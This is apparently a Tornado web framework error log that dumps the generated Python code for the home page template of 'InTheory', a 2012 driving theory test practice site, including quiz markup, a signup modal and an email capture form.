226      _append('\n<h4> ')  # home.html:26 (via base.html:87)
227      _tmp = question.question  # home.html:26 (via base.html:87)
228      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:26 (via base.html:87)
229      else: _tmp = _utf8(str(_tmp))  # home.html:26 (via base.html:87)
230      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:26 (via base.html:87)
231      _append(_tmp)  # home.html:26 (via base.html:87)
232      _append('</h4>\n<ul remaining-answers=')  # home.html:27 (via base.html:87)
233      _tmp = len(question.answer)  # home.html:27 (via base.html:87)
234      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:27 (via base.html:87)
235      else: _tmp = _utf8(str(_tmp))  # home.html:27 (via base.html:87)
236      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:27 (via base.html:87)
237      _append(_tmp)  # home.html:27 (via base.html:87)
238      _append(' class="nav nav-pills nav-stacked">\n<li><a class="choice" ind="0"><span class="badge badge-info">A</span> ')  # home.html:28 (via base.html:87)
239      _tmp = question.options[0]  # home.html:28 (via base.html:87)
240      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:28 (via base.html:87)
241      else: _tmp = _utf8(str(_tmp))  # home.html:28 (via base.html:87)
242      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:28 (via base.html:87)
243      _append(_tmp)  # home.html:28 (via base.html:87)
244      _append('</a></li>\n<li><a class="choice" ind="1"><span class="badge badge-info">B</span> ')  # home.html:29 (via base.html:87)
245      _tmp = question.options[1]  # home.html:29 (via base.html:87)
246      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:29 (via base.html:87)
247      else: _tmp = _utf8(str(_tmp))  # home.html:29 (via base.html:87)
248      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:29 (via base.html:87)
249      _append(_tmp)  # home.html:29 (via base.html:87)
250      _append('</a></li>\n<li><a class="choice" ind="2"><span class="badge badge-info">C</span> ')  # home.html:30 (via base.html:87)
251      _tmp = question.options[2]  # home.html:30 (via base.html:87)
252      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:30 (via base.html:87)
253      else: _tmp = _utf8(str(_tmp))  # home.html:30 (via base.html:87)
254      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:30 (via base.html:87)
255      _append(_tmp)  # home.html:30 (via base.html:87)
256      _append('</a></li>\n<li><a class="choice" ind="3"><span class="badge badge-info">D</span> ')  # home.html:31 (via base.html:87)
257      _tmp = question.options[3]  # home.html:31 (via base.html:87)
258      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:31 (via base.html:87)
259      else: _tmp = _utf8(str(_tmp))  # home.html:31 (via base.html:87)
260      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:31 (via base.html:87)
261      _append(_tmp)  # home.html:31 (via base.html:87)
262      _append('</a></li>\n</ul>\n<a id="next" class="btn btn-success btn-mini disabled">Next Question</a>\n</div>\n</div>\n</div>\n</div>\n</div>\n<div class="row">\n<div class="span10">\n</div>\n<div class="span5 offset5">\n</br></br>\n<blockquote>\n<p>\n<h2><div class="funkytext"><font color="#ffffff">"')  # home.html:47 (via base.html:87)
263      _tmp = kwargs['tweet']  # home.html:47 (via base.html:87)
264      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:47 (via base.html:87)
265      else: _tmp = _utf8(str(_tmp))  # home.html:47 (via base.html:87)
266      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:47 (via base.html:87)
267      _append(_tmp)  # home.html:47 (via base.html:87)
268      _append('"</h2>\n<div class="funkytext">- Dave Mason, London</font></div>\n</p>\n</blockquote>\n</div>\n</div>\n</div> <!-- /container -->\n<div id="dim">\n</div>\n')  # home.html:57 (via base.html:87)
269      _append('\n')  # base.html:91
270      _tmp = xsrf_form_html()  # base.html:91
271      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:91
272      else: _tmp = _utf8(str(_tmp))  # base.html:91
273      _append(_tmp)  # base.html:91
274      _append('\n')  # base.html:92
275      _append('\n<script src="')  # base.html:93 (via base.html:92)
276      _tmp = static_url('js/libs/jquery-1.7.2.min.js')  # base.html:93 (via base.html:92)
277      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:93 (via base.html:92)
278      else: _tmp = _utf8(str(_tmp))  # base.html:93 (via base.html:92)
279      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:93 (via base.html:92)
280      _append(_tmp)  # base.html:93 (via base.html:92)
281      _append('"></script>\n<script src="')  # base.html:94 (via base.html:92)
282      _tmp = static_url('js/libs/blurb.min.js')  # base.html:94 (via base.html:92)
283      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:94 (via base.html:92)
284      else: _tmp = _utf8(str(_tmp))  # base.html:94 (via base.html:92)
285      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:94 (via base.html:92)
286      _append(_tmp)  # base.html:94 (via base.html:92)
287      _append('"></script>\n<script src="')  # base.html:95 (via base.html:92)
288      _tmp = static_url('js/IT.js')  # base.html:95 (via base.html:92)
289      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:95 (via base.html:92)
290      else: _tmp = _utf8(str(_tmp))  # base.html:95 (via base.html:92)
291      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:95 (via base.html:92)
292      _append(_tmp)  # base.html:95 (via base.html:92)
293      _append('"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-dropdown.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-button.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-modal.js"></script>\n')  # base.html:99 (via base.html:92)
294      _append('\n')  # base.html:101
295      for js in kwargs['js_deps']:  # base.html:101
296          _append('\n<script src="')  # base.html:102
297          _tmp = static_url(js)  # base.html:102
298          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:102
299          else: _tmp = _utf8(str(_tmp))  # base.html:102
300          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:102
301          _append(_tmp)  # base.html:102
302          _append('"></script>\n')  # base.html:103
303      _append('\n')  # base.html:105
304      _append('\n<script id="signup-template" type="text/x-jquery-tmpl">\n<div id="windowTitleDialog" class="modal hide fade">\n<div class="modal-header">\n<a class="close">&times;</a>\n<h3>You scored ${score} out of 5!</h3>\n</div>\n<div class="modal-body">\n<p>You still need a little practice, but don\'t worry we\'re here to help you pass. Sign-up today to get started...</p>\n<a href="/login"><center><img src="')  # home.html:68 (via base.html:105)
305      _tmp = static_url('imgs/facebook.png')  # home.html:68 (via base.html:105)
306      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:68 (via base.html:105)
307      else: _tmp = _utf8(str(_tmp))  # home.html:68 (via base.html:105)
308      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:68 (via base.html:105)
309      _append(_tmp)  # home.html:68 (via base.html:105)
310      _append('" alt="some_text"/></a>\n<img src="')  # home.html:69 (via base.html:105)
311      _tmp = static_url('imgs/twitter.png')  # home.html:69 (via base.html:105)
312      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:69 (via base.html:105)
313      else: _tmp = _utf8(str(_tmp))  # home.html:69 (via base.html:105)
314      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:69 (via base.html:105)
315      _append(_tmp)  # home.html:69 (via base.html:105)
316      _append('" alt="some_text"/>\n<img src="')  # home.html:70 (via base.html:105)
317      _tmp = static_url('imgs/google.png')  # home.html:70 (via base.html:105)
318      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:70 (via base.html:105)
319      else: _tmp = _utf8(str(_tmp))  # home.html:70 (via base.html:105)
320      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:70 (via base.html:105)
321      _append(_tmp)  # home.html:70 (via base.html:105)
322      _append('" alt="some_text"/></center>\n<center><a href="h">Or click here to sign-up directly</a></center>\n</div>\n<div class="modal-footer">\n<ul class="pager">\n<li class="previous"><a href="#">Sign in to InTheory</a></li>\n<li class="next"><a href="#">Forgot username or password?</a></li>\n</ul>\n</div>\n</div>\n</script>\n<script id="show-arrow-template" type="text/x-jquery-tmpl">\n<div class="arrow-container">\n<img src="')  # home.html:84 (via base.html:105)
323      _tmp = static_url('imgs/arrow.png')  # home.html:84 (via base.html:105)
324      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:84 (via base.html:105)
325      else: _tmp = _utf8(str(_tmp))  # home.html:84 (via base.html:105)
326      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:84 (via base.html:105)
327      _append(_tmp)  # home.html:84 (via base.html:105)
328      _append('"/>\n</div>\n</script>\n<script id="email-template" type="text/x-jquery-tmpl">\n<div id="windowTitleDialog" class="modal hide fade">\n<div class="modal-header">\n<a class="close">&times;</a>\n<h3>You scored ${score} out of 10!</h3>\n</div>\n<div class="modal-body">\n<center>\n<p>Leave your email and we\'ll let you know when we launch!</p>\n<form method="post" class="af-form-wrapper" action="http://www.aweber.com/scripts/addlead.pl" >\n<div style="display: none;">\n<input type="hidden" name="meta_web_form_id" value="677441365" />\n<input type="hidden" name="meta_split_id" value="" />\n<input type="hidden" name="listname" value="intheory" />\n<input type="hidden" name="redirect" value="http://www.aweber.com/thankyou-coi.htm?m=video" id="redirect_b3be9783c304109a8d9d9ca013e7b651" />\n<input type="hidden" name="meta_adtracking" value="Waiting_List_/_Splash" />\n<input type="hidden" name="meta_message" value="1" />\n<input type="hidden" name="meta_required" value="name,email" />\n<input type="hidden" name="meta_tooltip" value="" />\n</div>\n<div id="af-form-677441365" class="af-form"><div id="af-body-677441365" class="af-body af-standards">\n<div class="af-element">\n<div class="af-textWrap"></br>\n<input id="awf_field-39151245" type="text" name="name" class="text" placeholder="Enter Your Name" tabindex="500" />\n</div>\n<div class="af-clear"></div></div>\n<div class="af-element">\n<div class="af-textWrap"><input class="text" id="awf_field-39151246" type="text" name="email" placeholder="Enter Your Email" tabindex="501" />\n</div><div class="af-clear"></div>\n</div>\n<input name="submit" class="btn btn-primaryw" type="submit" value="Submit" tabindex="502" />\n</br>\n<a href="/login">or connect with Facebook</a>\n</div>\n</br></br>\n<div class="af-element privacyPolicy" style="text-align: center"><p>We respect your <a title="Privacy Policy" href="http://www.aweber.com/permission.htm" target="_blank">email privacy</a></p>\n<div class="af-clear"></div>\n</div>\n</div>\n</div>\n<div style="display: none;"><img src="http://forms.aweber.com/form/displays.htm?id=bOzsLCyMzGys" alt="" /></div>\n</form>\n</center>\n<script type="text/javascript">\n<!--\n(function() {\nvar IE = /*@cc_on!@*/false;\nif (!IE) { return; }\nif (document.compatMode && document.compatMode == \'BackCompat\') {\nif (document.getElementById("af-form-677441365")) {\ndocument.getElementById("af-form-677441365").className = \'af-form af-quirksMode\';\n}\nif (document.getElementById("af-body-677441365")) {\ndocument.getElementById("af-body-677441365").className = "af-body inline af-quirksMode";\n}\nif (document.getElementById("af-header-677441365")) {\ndocument.getElementById("af-header-677441365").className = "af-header af-quirksMode";\n}\nif (document.getElementById("af-footer-677441365")) {\ndocument.getElementById("af-footer-677441365").className = "af-footer af-quirksMode";\n}\n}\n})();\n-->\n</script>\n</div>\n</div>\n</script>\n')  # home.html:158 (via base.html:105)
329      _append('\n<div class="container">\n<div class="footer"><font color="#FFFFFF" size="2px"> <p class="alignleft">InTheory Media Limited \xc2\xa9 2012</p>\n<p class="alignright"><a href="/landing/about">About Us</a> | <a href="/landing/terms">Terms & Conditions</a> | <a href="/landing/privacy">Privacy Policy</a> | Support </p></font></br>\n</div>\n</div>\n</body>\n</html>\n')  # base.html:117
330      return _utf8('').join(_buffer)  # base.html:0
ERROR:root:home.html code:
  1  def _execute():  # base.html:0
  2      _buffer = []  # base.html:0
  3      _append = _buffer.append  # base.html:0
  4      _append('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\n<!--[if lt IE 7 ]> <html lang="en" class="no-js ie6"> <![endif]-->\n<!--[if IE 7 ]> <html lang="en" class="no-js ie7"> <![endif]-->\n<!--[if IE 8 ]> <html lang="en" class="no-js ie8"> <![endif]-->\n<!--[if IE 9 ]> <html lang="en" class="no-js ie9"> <![endif]-->\n<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js"> <!--<![endif]-->\n<head xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml">\n<meta charset="utf-8">\n<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">\n<meta name="author" content="intheory">\n<meta name="description" content="Intheory 2012">\n<meta property="og:image" content="http://www.petrominpng.com.pg/images/logo_big.png" />\n<meta name="viewport" content="width=920, initial-scale=auto">\n<meta property="og:type" content="website" />\n<meta property="og:title" content="Intheory 2012" />\n<meta property="og:site_name" content="Intheory 2012" />\n<title>\n')  # base.html:19
  5      _append('\nInTheory | Pass Your Theory Test. Guaranteed.\n')  # base.html:21 (via base.html:19)
  6      _append('\n</title>\n<link href="../static/css/bootstrap.css" rel="stylesheet">\n<link href="../static/css/bootstrap-responsive.css" rel="stylesheet">\n<link rel="stylesheet" href="')  # base.html:25
  7      _tmp = static_url('css/base.css')  # base.html:25
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:25
  9      else: _tmp = _utf8(str(_tmp))  # base.html:25
 10      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:25
 11      _append(_tmp)  # base.html:25
 12      _append('" />\n')  # base.html:26
 13      for css in kwargs['css_deps']:  # base.html:26
 14          _append('\n<link href="')  # base.html:27
 15          _tmp = static_url(css)  # base.html:27
 16          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:27
 17          else: _tmp = _utf8(str(_tmp))  # base.html:27
 18          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:27
 19          _append(_tmp)  # base.html:27
 20          _append('" rel="stylesheet">\n')  # base.html:28
 21      _append('\n<style type="text/css">\nhtml{\nbackground-image: url(/static/imgs/background.jpg);\nbackground-repeat: no-repeat;\n}\nbody {\npadding-top: 60px;\npadding-bottom: 40px;\n}\n</style>\n<script type="text/javascript">\nvar _gaq = _gaq || [];\n_gaq.push([\'_setAccount\', \'UA-34526303-1\']);\n_gaq.push([\'_trackPageview\']);\n(function() {\nvar ga = document.createElement(\'script\'); ga.type = \'text/javascript\'; ga.async = true;\nga.src = (\'https:\' == document.location.protocol ? \'https://ssl\' : \'http://www\') + \'.google-analytics.com/ga.js\';\nvar s = document.getElementsByTagName(\'script\')[0]; s.parentNode.insertBefore(ga, s);\n})();\n</script>\n</head>\n<body >\n')  # base.html:56
 22      _append('\n<div class="navbar navbar-fixed-top">\n<div class="navbar-inner">\n<div class="container">\n<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n</a>\n<a class="brand" href="/"> <img src="')  # base.html:65 (via base.html:56)
 23      _tmp = static_url('imgs/logo.png')  # base.html:65 (via base.html:56)
 24      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:65 (via base.html:56)
 25      else: _tmp = _utf8(str(_tmp))  # base.html:65 (via base.html:56)
 26      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:65 (via base.html:56)
 27      _append(_tmp)  # base.html:65 (via base.html:56)
 28      _append('"></a>\n<div class="pull-right">\n')  # base.html:67 (via base.html:56)
 29      if not current_user:  # base.html:67 (via base.html:56)
 30          _append('\n<a href="/login"><button type="submit" class="btn btn-success">Sign in</button></a>\n')  # base.html:69 (via base.html:56)
 31      else:  # base.html:69 (via base.html:56)
 32          _append('\n<ul class="nav nav-pills">\n')  # base.html:71 (via base.html:56)
 33          if current_user['moderator']:  # base.html:71 (via base.html:56)
 34              _append('\n<li id="admin-nav"><a href="/admin">Admin</a></li>\n')  # base.html:73 (via base.html:56)
 35          _append('\n<li class="active"><a href="/learn/main">Learn</a></li>\n<li id="mock-test-nav"><a href="/test/new">Mock Test</a></li>\n<li><a href="/logout">Logout</a></li>\n<li>|</li>\n</ul>\n<img src="')  # base.html:79 (via base.html:56)
 36          _tmp = static_url('imgs/fb.png')  # base.html:79 (via base.html:56)
 37          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:79 (via base.html:56)
 38          else: _tmp = _utf8(str(_tmp))  # base.html:79 (via base.html:56)
 39          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:79 (via base.html:56)
 40          _append(_tmp)  # base.html:79 (via base.html:56)
 41          _append('" alt="My Image Description" class="align-left frame" /><div class="fb"><div class="fbname"><b>David Mason</b></div><div class="fbpoints"><b><font color="#0589de">217 Points</font></b></div></div>\n')  # base.html:80 (via base.html:56)
 42      _append('\n</div>\n</div>\n</div>\n</div>\n')  # base.html:85 (via base.html:56)
 43      _append('\n')  # base.html:87
 44      _append('\n<div class="container">\n<div class="hero-unit">\n<div class="hero-unit1">\n<div class="row-fluid">\n<div class="columnA pull-left">\n<h2>Pass your theory test.<br>Guaranteed.</h2>\n<ul>\n<li>The simplest and fastest way to pass your test.</li>\n<li>Use cool new learning techniques to help you remember the details.</li>\n<li>Don\'t pass first time? Get your money back.</li>\n</ul></br>\n<p><a id="get-started-btn" class="btn btn-block btn-success btn-large">Get Started Today</a></p>\n</div>\n<div class="columnB pull-right">\n</br>\n<div id="questions" data-questions=\n\'[{ "question":"')  # home.html:21 (via base.html:87)
 45      _tmp = kwargs["questions"][0].question  # home.html:21 (via base.html:87)
 46      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
 47      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
 48      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
 49      _append(_tmp)  # home.html:21 (via base.html:87)
 50      _append('","options": ["')  # home.html:21 (via base.html:87)
 51      _tmp = kwargs["questions"][0].options[0]  # home.html:21 (via base.html:87)
 52      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
 53      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
 54      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
 55      _append(_tmp)  # home.html:21 (via base.html:87)
 56      _append('", "')  # home.html:21 (via base.html:87)
 57      _tmp = kwargs["questions"][0].options[1]  # home.html:21 (via base.html:87)
 58      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
 59      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
 60      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
 61      _append(_tmp)  # home.html:21 (via base.html:87)
 62      _append('", "')  # home.html:21 (via base.html:87)
 63      _tmp = kwargs["questions"][0].options[2]  # home.html:21 (via base.html:87)
 64      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
 65      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
 66      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
 67      _append(_tmp)  # home.html:21 (via base.html:87)
 68      _append('", "')  # home.html:21 (via base.html:87)
 69      _tmp = kwargs["questions"][0].options[3]  # home.html:21 (via base.html:87)
 70      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
 71      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
 72      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
 73      _append(_tmp)  # home.html:21 (via base.html:87)
 74      _append('"],"answer": ')  # home.html:21 (via base.html:87)
 75      _tmp = kwargs["questions"][0].answer  # home.html:21 (via base.html:87)
 76      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
 77      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
 78      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
 79      _append(_tmp)  # home.html:21 (via base.html:87)
 80      _append('},{ "question":"')  # home.html:21 (via base.html:87)
 81      _tmp = kwargs["questions"][1].question  # home.html:21 (via base.html:87)
 82      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
 83      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
 84      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
 85      _append(_tmp)  # home.html:21 (via base.html:87)
 86      _append('","options": ["')  # home.html:21 (via base.html:87)
 87      _tmp = kwargs["questions"][1].options[0]  # home.html:21 (via base.html:87)
 88      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
 89      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
 90      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
 91      _append(_tmp)  # home.html:21 (via base.html:87)
 92      _append('", "')  # home.html:21 (via base.html:87)
 93      _tmp = kwargs["questions"][1].options[1]  # home.html:21 (via base.html:87)
 94      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
 95      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
 96      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
 97      _append(_tmp)  # home.html:21 (via base.html:87)
 98      _append('", "')  # home.html:21 (via base.html:87)
 99      _tmp = kwargs["questions"][1].options[2]  # home.html:21 (via base.html:87)
100      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
101      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
102      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
103      _append(_tmp)  # home.html:21 (via base.html:87)
104      _append('", "')  # home.html:21 (via base.html:87)
105      _tmp = kwargs["questions"][1].options[3]  # home.html:21 (via base.html:87)
106      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
107      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
108      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
109      _append(_tmp)  # home.html:21 (via base.html:87)
110      _append('"],"answer": ')  # home.html:21 (via base.html:87)
111      _tmp = kwargs["questions"][1].answer  # home.html:21 (via base.html:87)
112      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
113      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
114      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
115      _append(_tmp)  # home.html:21 (via base.html:87)
116      _append('}, { "question":"')  # home.html:21 (via base.html:87)
117      _tmp = kwargs["questions"][2].question  # home.html:21 (via base.html:87)
118      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
119      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
120      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
121      _append(_tmp)  # home.html:21 (via base.html:87)
122      _append('","options": ["')  # home.html:21 (via base.html:87)
123      _tmp = kwargs["questions"][2].options[0]  # home.html:21 (via base.html:87)
124      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
125      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
126      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
127      _append(_tmp)  # home.html:21 (via base.html:87)
128      _append('", "')  # home.html:21 (via base.html:87)
129      _tmp = kwargs["questions"][2].options[1]  # home.html:21 (via base.html:87)
130      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
131      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
132      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
133      _append(_tmp)  # home.html:21 (via base.html:87)
134      _append('", "')  # home.html:21 (via base.html:87)
135      _tmp = kwargs["questions"][2].options[2]  # home.html:21 (via base.html:87)
136      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
137      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
138      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
139      _append(_tmp)  # home.html:21 (via base.html:87)
140      _append('", "')  # home.html:21 (via base.html:87)
141      _tmp = kwargs["questions"][2].options[3]  # home.html:21 (via base.html:87)
142      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
143      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
144      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
145      _append(_tmp)  # home.html:21 (via base.html:87)
146      _append('"],"answer": ')  # home.html:21 (via base.html:87)
147      _tmp = kwargs["questions"][2].answer  # home.html:21 (via base.html:87)
148      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
149      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
150      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
151      _append(_tmp)  # home.html:21 (via base.html:87)
152      _append('},{ "question":"')  # home.html:21 (via base.html:87)
153      _tmp = kwargs["questions"][3].question  # home.html:21 (via base.html:87)
154      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
155      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
156      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
157      _append(_tmp)  # home.html:21 (via base.html:87)
158      _append('","options": ["')  # home.html:21 (via base.html:87)
159      _tmp = kwargs["questions"][3].options[0]  # home.html:21 (via base.html:87)
160      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
161      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
162      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
163      _append(_tmp)  # home.html:21 (via base.html:87)
164      _append('", "')  # home.html:21 (via base.html:87)
165      _tmp = kwargs["questions"][3].options[1]  # home.html:21 (via base.html:87)
166      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
167      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
168      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
169      _append(_tmp)  # home.html:21 (via base.html:87)
170      _append('", "')  # home.html:21 (via base.html:87)
171      _tmp = kwargs["questions"][3].options[2]  # home.html:21 (via base.html:87)
172      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
173      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
174      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
175      _append(_tmp)  # home.html:21 (via base.html:87)
176      _append('", "')  # home.html:21 (via base.html:87)
177      _tmp = kwargs["questions"][3].options[3]  # home.html:21 (via base.html:87)
178      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
179      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
180      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
181      _append(_tmp)  # home.html:21 (via base.html:87)
182      _append('"],"answer": ')  # home.html:21 (via base.html:87)
183      _tmp = kwargs["questions"][3].answer  # home.html:21 (via base.html:87)
184      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
185      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
186      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
187      _append(_tmp)  # home.html:21 (via base.html:87)
188      _append('}, { "question":"')  # home.html:21 (via base.html:87)
189      _tmp = kwargs["questions"][4].question  # home.html:21 (via base.html:87)
190      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
191      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
192      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
193      _append(_tmp)  # home.html:21 (via base.html:87)
194      _append('","options": ["')  # home.html:21 (via base.html:87)
195      _tmp = kwargs["questions"][4].options[0]  # home.html:21 (via base.html:87)
196      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
197      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
198      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
199      _append(_tmp)  # home.html:21 (via base.html:87)
200      _append('", "')  # home.html:21 (via base.html:87)
201      _tmp = kwargs["questions"][4].options[1]  # home.html:21 (via base.html:87)
202      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
203      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
204      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
205      _append(_tmp)  # home.html:21 (via base.html:87)
206      _append('", "')  # home.html:21 (via base.html:87)
207      _tmp = kwargs["questions"][4].options[2]  # home.html:21 (via base.html:87)
